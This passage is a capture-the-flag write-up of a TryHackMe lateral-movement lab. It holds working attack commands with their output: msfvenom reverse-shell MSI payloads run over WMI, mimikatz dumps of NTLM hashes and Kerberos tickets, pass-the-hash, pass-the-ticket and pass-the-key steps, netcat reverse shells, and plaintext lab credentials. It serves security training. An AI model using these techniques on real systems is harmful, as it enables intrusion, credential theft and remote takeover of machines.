**Note**: Since you will be sharing the lab with others, you'll want to use a different filename for your payload instead of "myinstaller.msi" to avoid overwriting someone else's payload.

```bash
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
```

We then copy the payload using SMB or any other method available:

```bash
user@AttackBox$ smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
 putting file myinstaller.msi as \myinstaller.msi (0.0 kb/s) (average 0.0 kb/s)
```

Since we copied our payload to the ADMIN$ share, it will be available at `C:\Windows\` on the server.

We start a handler to receive the reverse shell from Metasploit:

```bash
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4445
```

Let's start a WMI session against THMIIS from a Powershell console:

```powershell
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

We then invoke the Install method from the Win32_Product class to trigger the payload:

```bash
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

As a result, you should receive a connection in your AttackBox from where you can access a flag on t1_corine.waters desktop.

---------------------------------------------------------------------------

#### After running the "flag.exe" file on t1_corine.waters desktop on THMIIS, what is the flag?

Create malicious MSI-packet that spawns a reverse shell and ipload it to the IIS-server

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > cajacinstaller.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ smbclient -c 'put cajacinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
putting file cajacinstaller.msi as \cajacinstaller.msi (445.7 kb/s) (average 445.7 kb/s)
```

Start a multi/handler to recieve the reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 4445;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
LHOST => lateralmovement
LPORT => 4445
[*] Started reverse TCP handler on 10.150.74.4:4445 
```

On the SSH-session, configure DCOM-session and launch MSI

```powershell
za\tony.holland@THMJMP2 C:\Users\tony.holland>powershell.exe
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\tony.holland> $username = 't1_corine.waters';
PS C:\Users\tony.holland> $password = 'Korine.1994';
PS C:\Users\tony.holland> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\Users\tony.holland> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\Users\tony.holland> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\Users\tony.holland> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
PS C:\Users\tony.holland> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\cajacinstaller.msi"; Options = ""; AllUsers = $false}


ReturnValue PSComputerName 
----------- -------------- 
       1603 thmiis.za.tryhackme.com 


PS C:\Users\tony.holland> 
```

Back at the multi/handler, we now have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 4445;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
LHOST => lateralmovement
LPORT => 4445
[*] Started reverse TCP handler on 10.150.74.4:4445 
[*] Command shell session 1 opened (10.150.74.4:4445 -> 10.200.74.201:62293) at 2026-04-30 16:49:04 +0200


Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----
 

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\t1_corine.waters\Desktop
cd C:\Users\t1_corine.waters\Desktop

C:\Users\t1_corine.waters\Desktop>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\t1_corine.waters\Desktop

2022/06/17  18:52    <DIR>          .
2022/06/17  18:52    <DIR>          ..
2022/06/17  18:52            58�368 Flag.exe
               1 File(s)         58�368 bytes
               2 Dir(s)  46�545�883�136 bytes free

C:\Users\t1_corine.waters\Desktop>Flag.exe
Flag.exe
THM{<REDACTED>}


C:\Users\t1_corine.waters\Desktop>
```

Answer: `THM{<REDACTED>}`

---------------------------------------------------------------------------

### Task 5: Use of Alternate Authentication Material

By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. This is possible because of how some authentication protocols used by Windows networks work. In this task, we will take a look at a couple of alternatives available to log as a user when either of the following authentication protocols is available on the network:

- NTLM authentication
- Kerberos authentication

**Note**: During this task, you are assumed to be familiar with the methods and tools to extract credentials from a host. Mimikatz will be used as the tool of choice for credential extraction throughout the room.

#### NTLM Authentication

Before diving into the actual lateral movement techniques, let's take a look at how NTLM authentication works:

![NTLM Authentication](Images/NTLM_Authentication.png)

1. The client sends an authentication request to the server they want to access.
2. The server generates a random number and sends it as a challenge to the client.
3. The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
4. The server forwards both the challenge and the response to the Domain Controller for verification.
5. The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
6. The server forwards the authentication result to the client.

**Note**: The described process applies when using a domain account. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.

#### Pass-the-Hash

As a result of extracting credentials from a host where we have attained administrative privileges (by using mimikatz or similar tools), we might get clear-text passwords or hashes that can be easily cracked. However, if we aren't lucky enough, we will end up with non-cracked NTLM password hashes.

Although it may seem we can't really use those hashes, the NTLM challenge sent during authentication can be responded to just by knowing the password hash. This means we can authenticate without requiring the plaintext password to be known. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can **Pass-the-Hash** (PtH) and authenticate successfully.

To extract NTLM hashes, we can either use mimikatz to read the local SAM or extract hashes directly from LSASS memory.

**Extracting NTLM hashes from local SAM**:

This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

```text
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

**Extracting NTLM hashes from LSASS memory**:

This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

```text
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:

```text
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Notice we used `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.

This would be the equivalent of using `runas /netonly` but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.

To receive the reverse shell, we should run a reverse listener on our AttackBox:

```bash
user@AttackBox$ nc -lvp 5555
```

**Passing the Hash Using Linux**:

If you have access to a linux box (like your AttackBox), several tools have built-in support to perform PtH using different protocols. Depending on which services are available to you, you can do the following:

Connect to RDP using PtH:

`xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`

Connect via psexec using PtH:

`psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`

**Note**: Only the linux version of psexec support PtH.

Connect to WinRM using PtH:

`evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`

#### Kerberos Authentication

Let's have a quick look at how Kerberos authentication works on Windows networks:

**Step 1**: The user sends his username and a timestamp encrypted using a key derived from his password to the **Key Distribution Center** (KDC), a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.

The KDC will create and send back a **Ticket Granting Ticket** (TGT), allowing the user to request tickets to access specific services without passing their credentials to the services themselves. Along with the TGT, a **Session Key** is given to the user, which they will need to generate the requests that follow.

Notice the TGT is encrypted using the **krbtgt** account's password hash, so the user can't access its contents. It is important to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.

![Kerberos Authentication](Images/Kerberos_Authentication.png)

**Step 2**: When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service** (TGS). TGS are tickets that allow connection only to the specific service for which they were created. To request a TGS, the user will send his username and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name** (SPN), which indicates the service and server name we intend to access.

As a result, the KDC will send us a TGS and a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using the **Service Owner Hash**. The Service Owner is the user or machine account under which the service runs. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.

![Kerberos Authentication 2](Images/Kerberos_Authentication_2.png)

**Step 3**: The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.

![Kerberos Authentication 3](Images/Kerberos_Authentication_3.png)

#### Pass-the-Ticket

Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Notice that if we only had access to a ticket but not its corresponding session key, we wouldn't be able to use that ticket; therefore, both are necessary.

While mimikatz can extract any TGT or TGS available from the memory of the LSASS process, most of the time, we'll be interested in TGTs as they can be used to request access to any services the user is allowed to access. At the same time, TGSs are only good for a specific service. Extracting TGTs will require us to have administrator's credentials, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account).

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:

```text
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the `klist` command:

```bat
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

#### Overpass-the-hash / Pass-the-Key

This kind of attack is similar to PtH but applied to Kerberos networks.

When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name **Pass-the-key** (PtK).

We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (`nc64` is already available in THMJMP2 for your convenience):

If we have the **RC4 hash**:

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

If we have the **AES128 hash**:

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

If we have the **AES256 hash**:

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as **Overpass-the-Hash** (OPtH).

To receive the reverse shell, we should run a reverse listener on our AttackBox:

```bash
user@AttackBox$ nc -lvp 5556
```

Just as with PtH, any command run from this shell will use the credentials injected via mimikatz.

#### Let's Get to Work

To begin this exercise, you will need to connect to THMJMP2 using the following credentials via SSH:

- Username: `ZA.TRYHACKME.COM\t2_felicia.dean`
- Password: `iLov3THM!`

`ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
za\t2_felicia.dean@thmjmp2.za.tryhackme.com's password: 
Microsoft Windows [Version 10.0.14393] 
(c) 2016 Microsoft Corporation. All rights reserved. 

za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean>   
```

These credentials will grant you administrative access to THMJMP2, allowing you to use mimikatz to dump the authentication material needed to perform any of the techniques presented during this task.

Using your SSH session, use mimikatz to extract authentication material and perform Pass-the-Hash, Pass-the-Ticket or Pass-the-Key against domain user `t1_toby.beck`.

Once you have a command prompt with his credentials loaded, use `winrs` to connect to a command prompt on THMIIS. Since t1_toby.beck's credentials are already injected in your session as a result of any of the attacks, you can use winrs without specifying any credentials, and it will use the ones available to your current session:

`winrs.exe -r:THMIIS.za.tryhackme.com cmd`

You'll find a flag on t1_toby.beck's desktop on THMIIS. Both `mimikatz` and `psexec64` are available at `C:\tools` on THMJMP2.

---------------------------------------------------------------------------

**Method 1** - Pass the Hash:

Connect with SSH as t2_felicia.dean

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
za\t2_felicia.dean@thmjmp2.za.tryhackme.com's password: 
Microsoft Windows [Version 10.0.14393] 
(c) 2016 Microsoft Corporation. All rights reserved. 

za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean>   
```

Run Mimikatz, escalate privs and dump NTLM hashes

```bat
za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean>cd C:\Tools 

za\t2_felicia.dean@THMJMP2 C:\tools>mimikatz.exe 

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz 
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz # privilege::debug 
Privilege '20' OK

mimikatz # token::elevate 
Token Id  : 0 
User name : 
SID name  : NT AUTHORITY\SYSTEM 

528     {0;000003e7} 1 D 19204          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
-> Impersonated !
 * Process Token : {0;00bce660} 0 D 13584876    ZA\t2_felicia.dean      S-1-5-21-3330634377-1326264276-632209373-4605   (12g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 13658142    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::msv 

Authentication Id : 0 ; 9434369 (00000000:008ff501) 
Session           : NetworkCleartext from 0 
User Name         : tony.holland 
Domain            : ZA 
Logon Server      : THMDC 
Logon Time        : 4/30/2026 1:45:48 PM 
SID               : S-1-5-21-3330634377-1326264276-632209373-1135 
        msv : 
         [00000003] Primary 
         * Username : tony.holland 
         * Domain   : ZA 
         * NTLM     : 72d4d4e52b575539c80ece38541e8ab4 
         * SHA1     : 261599d3c767ab6bfaed41670fd7d2ea0b7b1d83 
         * DPAPI    : 343b6e5ec6d9267a0aa39f11ef522891 

<---snip--->

Authentication Id : 0 ; 1059897 (00000000:00102c39)
Session           : RemoteInteractive from 6  
User Name         : t1_toby.beck4 
Domain            : ZA 
Logon Server      : THMDC 
Logon Time        : 4/30/2026 11:38:58 AM 
SID               : S-1-5-21-3330634377-1326264276-632209373-4619 
        msv : 
         [00000003] Primary
         * Username : t1_toby.beck4
         * Domain   : ZA 
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
         * DPAPI    : 47d511de8e208dc0053e88223dcdd31c 

Authentication Id : 0 ; 952576 (00000000:000e8900)
Session           : RemoteInteractive from 5  
User Name         : t1_toby.beck3 
Domain            : ZA 
Logon Server      : THMDC 
Logon Time        : 4/30/2026 11:38:47 AM 
SID               : S-1-5-21-3330634377-1326264276-632209373-4618 
        msv : 
         [00000003] Primary 
         * Username : t1_toby.beck3
         * Domain   : ZA
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
         * DPAPI    : 20fa99221aff152851ce37bcd510e61e 

<---snip---> 
mimikatz #   
```

Start a netcat listener on port 5555

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ nc -lvnp 5555 
listening on [any] 5555 ...

```

Pass the Hash as t1_toby.beck to start a reverse shell

```bat
mimikatz # token::revert 
 * Process Token : {0;00bce660} 0 D 12937397    ZA\t2_felicia.dean      S-1-5-21-3330634377-1326264276-632209373-4605   (12g,24p)       Primary
 * Thread Token  : no token 

mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.4 5555"
user    : t1_toby.beck 
domain  : za.tryhackme.com 
program : c:\tools\nc64.exe -e cmd.exe 10.150.74.4 5555
impers. : no 
NTLM    : 533f1bd576caa912bdb9da284bbc60fe 
  |  PID  5640 
  |  TID  4668 
  |  LSA Process is now R/W 
  |  LUID 0 ; 13310657 (00000000:00cb1ac1) 
  \_ msv1_0   - data copy @ 0000026E6A975270 : OK !
  \_ kerberos - data copy @ 0000026E6B84CC48 
   \_ aes256_hmac       -> null 
   \_ aes128_hmac       -> null 
   \_ rc4_hmac_nt       OK 
   \_ rc4_hmac_old      OK 
   \_ rc4_md4           OK 
   \_ rc4_hmac_nt_exp   OK 
   \_ rc4_hmac_old_exp  OK 
   \_ *Password replace @ 0000026E6B7F27D8 (32) -> null
 
mimikatz #   
```

Back at the netcat listener we have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ nc -lvnp 5555 
listening on [any] 5555 ...
connect to [10.150.74.4] from (UNKNOWN) [10.200.74.249] 61250
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
za\t2_felicia.dean

C:\Windows\system32>
```

Note that our original user is shown by `whoami`!

#### What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on THMIIS?

Finally, we connect to the IIS-server and get the flag.

```bat
C:\Windows\system32>winrs.exe -r:THMIIS.za.tryhackme.com cmd.exe
winrs.exe -r:THMIIS.za.tryhackme.com cmd.exe
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\t1_toby.beck>cd Desktop
cd Desktop

C:\Users\t1_toby.beck\Desktop>flag.exe 
flag.exe
THM{<REDACTED>}


C:\Users\t1_toby.beck\Desktop>
```

**Method 2** - Pass the Ticket:

```bat
za\t2_felicia.dean@THMJMP2 C:\tools>mkdir cajac   
 
za\t2_felicia.dean@THMJMP2 C:\tools>mimikatz.exe 
 
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz 
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 
 
mimikatz # privilege::debug 
Privilege '20' OK 
 
mimikatz # cd cajac 
Cur: C:\tools 
New: C:\tools\cajac 
 
mimikatz # sekurlsa::tickets /export 
 
Authentication Id : 0 ; 8412827 (00000000:00805e9b) 
Session           : RemoteInteractive from 9 
User Name         : t2_abigail.cox 
Domain            : ZA 
Logon Server      : THMDC 
Logon Time        : 4/30/2026 1:35:43 PM 
SID               : S-1-5-21-3330634377-1326264276-632209373-4766 
 
         * Username : t2_abigail.cox 
         * Domain   : ZA.TRYHACKME.COM 
         * Password : (null) 
 
        Group 0 - Ticket Granting Service 
         [00000000] 
           Start/End/MaxRenew: 4/30/2026 1:35:51 PM ; 4/30/2026 11:35:43 PM ; 5/7/2026 1:35:43 PM 
           Service Name (02) : LDAP ; THMDC.za.tryhackme.com ; za.tryhackme.com ; @ ZA.TRYHACKME.COM 
           Target Name  (02) : LDAP ; THMDC.za.tryhackme.com ; za.tryhackme.com ; @ ZA.TRYHACKME.COM 
           Client Name  (01) : t2_abigail.cox ; @ ZA.TRYHACKME.COM ( ZA.TRYHACKME.COM ) 
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac 
             a90ee223b0cd8be83eacd3ab68ece6ab1affbb2b27fb7c7731a16ed3ab8a989a 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...] 
           * Saved to file [0;805e9b]-0-0-40a50000-t2_abigail.cox@LDAP-THMDC.za.tryhackme.com.kirbi !  

<---snip--->

         * Username : t1_toby.beck 
         * Domain   : ZA.TRYHACKME.COM 
         * Password : (null) 
 
        Group 0 - Ticket Granting Service 
         [00000000] 
           Start/End/MaxRenew: 4/30/2026 4:24:20 PM ; 5/1/2026 2:24:20 AM ; 5/7/2026 4:24:20 PM 
           Service Name (02) : HTTP ; THMIIS.za.tryhackme.com ; @ ZA.TRYHACKME.COM 
           Target Name  (02) : HTTP ; THMIIS.za.tryhackme.com ; @ ZA.TRYHACKME.COM 
           Client Name  (01) : t1_toby.beck ; @ ZA.TRYHACKME.COM 
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac 
             714d42f7f77175ea0b257caaa103c28f9678fb771ab1b5b4e0dd669029269b9f 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 1        [...] 
           * Saved to file [0;d7e7a2]-0-0-40a10000-t1_toby.beck@HTTP-THMIIS.za.tryhackme.com.kirbi !   

<---snip--->

mimikatz # kerberos::ptt [0;d7e7a2]-0-0-40a10000-t1_toby.beck@HTTP-THMIIS.za.tryhackme.com.kirbi 
 
* File: '[0;d7e7a2]-0-0-40a10000-t1_toby.beck@HTTP-THMIIS.za.tryhackme.com.kirbi': OK 

mimikatz # exit 
Bye! 
 
za\t2_felicia.dean@THMJMP2 C:\tools>winrs.exe -r:THMIIS.za.tryhackme.com cmd 
Microsoft Windows [Version 10.0.17763.1098] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Users\t1_toby.beck>whoami 
whoami 
za\t1_toby.beck 
 
C:\Users\t1_toby.beck>exit 
exit 
 
 
za\t2_felicia.dean@THMJMP2 C:\tools>   
```

**Method 3** - Pass the Key:

```bash
za\t2_felicia.dean@THMJMP2 C:\tools>mimikatz.exe 
 
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz 
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 
 
mimikatz # privilege::debug 
Privilege '20' OK 
 
mimikatz # sekurlsa::ekeys 
 
Authentication Id : 0 ; 15215647 (00000000:00e82c1f) 
Session           : NetworkCleartext from 0 
User Name         : t2_felicia.dean 
Domain            : ZA 
Logon Server      : THMDC 
Logon Time        : 4/30/2026 4:44:04 PM 
SID               : S-1-5-21-3330634377-1326264276-632209373-4605 
 
         * Username : t2_felicia.dean 
         * Domain   : ZA.TRYHACKME.COM 
         * Password : (null) 
         * Key List : 
           aes256_hmac       b7d40d6c43ff02f20bbceb962796cc7591c18ee0723f0fa6277b648385665bca 
           rc4_hmac_nt       7806fea66c81806b5dc068484b4567f6 
           rc4_hmac_old      7806fea66c81806b5dc068484b4567f6 
           rc4_md4           7806fea66c81806b5dc068484b4567f6 
           rc4_hmac_nt_exp   7806fea66c81806b5dc068484b4567f6 
           rc4_hmac_old_exp  7806fea66c81806b5dc068484b4567f6 
 
<---snip--->
 
Authentication Id : 0 ; 1059897 (00000000:00102c39) 
Session           : RemoteInteractive from 6 
User Name         : t1_toby.beck4 
Domain            : ZA 
Logon Server      : THMDC 
Logon Time        : 4/30/2026 11:38:58 AM 
SID               : S-1-5-21-3330634377-1326264276-632209373-4619 
 
         * Username : t1_toby.beck4 
         * Domain   : ZA.TRYHACKME.COM 
         * Password : (null) 
         * Key List : 
           aes256_hmac       e018fb45a79ef3d2378cd6752fc53f0b3cb4912dd3eab5a440183aceacb36db5 
           rc4_hmac_nt       533f1bd576caa912bdb9da284bbc60fe 
           rc4_hmac_old      533f1bd576caa912bdb9da284bbc60fe 
           rc4_md4           533f1bd576caa912bdb9da284bbc60fe 
           rc4_hmac_nt_exp   533f1bd576caa912bdb9da284bbc60fe 
           rc4_hmac_old_exp  533f1bd576caa912bdb9da284bbc60fe 
 
Authentication Id : 0 ; 952576 (00000000:000e8900) 
Session           : RemoteInteractive from 5 
User Name         : t1_toby.beck3 
Domain            : ZA 
Logon Server      : THMDC 
Logon Time        : 4/30/2026 11:38:47 AM 
SID               : S-1-5-21-3330634377-1326264276-632209373-4618 
 
         * Username : t1_toby.beck3 
         * Domain   : ZA.TRYHACKME.COM 
         * Password : (null) 
         * Key List : 
           aes256_hmac       2a59e02d204504015ed04fd1ff2dfef91d909dc13c13f0080a7f2a5cd2ddeb3f 
           rc4_hmac_nt       533f1bd576caa912bdb9da284bbc60fe 
           rc4_hmac_old      533f1bd576caa912bdb9da284bbc60fe 
           rc4_md4           533f1bd576caa912bdb9da284bbc60fe 
           rc4_hmac_nt_exp   533f1bd576caa912bdb9da284bbc60fe 
           rc4_hmac_old_exp  533f1bd576caa912bdb9da284bbc60fe 
 
Authentication Id : 0 ; 804453 (00000000:000c4665) 
Session           : RemoteInteractive from 4 
User Name         : t1_toby.beck2 
Domain            : ZA 
Logon Server      : THMDC 
Logon Time        : 4/30/2026 11:38:36 AM 
SID               : S-1-5-21-3330634377-1326264276-632209373-4617 
 
         * Username : t1_toby.beck2 
         * Domain   : ZA.TRYHACKME.COM 
         * Password : (null) 
         * Key List : 
           aes256_hmac       36c25383402319264d7e8a115b85c94d2444913c52ce506ce107332d2416bc91 
           rc4_hmac_nt       533f1bd576caa912bdb9da284bbc60fe 
           rc4_hmac_old      533f1bd576caa912bdb9da284bbc60fe 
           rc4_md4           533f1bd576caa912bdb9da284bbc60fe 
           rc4_hmac_nt_exp   533f1bd576caa912bdb9da284bbc60fe 
           rc4_hmac_old_exp  533f1bd576caa912bdb9da284bbc60fe 
 
<---snip--->
 
mimikatz #    
```

We start a netcat listener on port 5556

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ nc -lvnp 5556
listening on [any] 5556 ...

```

Then we Pass the Ticket

```bat
